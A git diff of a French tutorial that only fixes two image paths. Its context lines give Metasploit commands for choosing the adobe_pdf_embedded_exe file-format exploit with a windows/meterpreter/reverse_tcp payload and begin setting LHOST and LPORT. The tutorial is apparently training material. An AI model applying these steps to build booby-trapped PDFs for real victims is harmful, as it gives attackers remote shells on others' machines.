@@ -8,7 +8,7 @@ Tapez la commande ```msfconsole``` pour démarrer métasploit.
 Ensuite il faut chercher le payload. 
 Tapez search windows fileformat pdf. Vous aurez un résultat comme ci dessous :
 
-![image search](./images/search_msfconsole.png)
+![image search](images/reverse_shell/search_msfconsole.png)
 
 Plusieurs modules répondent à notre recherche, mais peu d’entre eux sont classés comme excellents. Nous allons donc prendre le numéro 6.
 Pour l’utiliser tapez ```use exploit/windows/fileformat/adobe_pdf_embedded_exe```
@@ -16,7 +16,7 @@ Nous allons vouloir configurer un payload qui nous fera une connexion vers notre
 Ainsi, tapons la commande : ```set payload windows/meterpreter/reverse_tcp```
 
 Pour voir les options actuelles du payload, tapez : ```show options```
-![image options](./images/show_options.png)
+![image options](images/show_options.png)
 
 Vous devriez avoir quelque chose comme cela, peut être qu’une adresse par défaut ou qu’un port par défaut à été renseigné pour LHOST et LPORT.
 Nous allons configurer ce payload. Il faut commencer par renseigner les valeurs de LHOST et LPORT.
